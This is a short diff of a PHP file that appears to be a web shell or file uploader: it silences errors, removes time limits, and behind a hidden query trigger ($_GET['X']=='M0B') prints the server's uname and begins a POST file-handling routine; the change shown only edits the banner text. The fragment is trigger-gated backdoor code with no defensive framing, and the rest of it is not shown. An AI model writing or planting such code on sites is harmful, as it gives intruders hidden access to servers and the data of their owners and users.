@@ -8,7 +8,7 @@ error_reporting(0);
 set_time_limit(0);
 
 if($_GET['X']=="M0B"){
-echo "<center><b>Uname:".php_uname()."<br></b>"; 
+echo "<center><b>M0B - Uname: ".php_uname()."<br></b>"; 
 echo '<font color="black" size="4">';
 if(isset($_POST['Submit'])){
     $filedir = ""; 
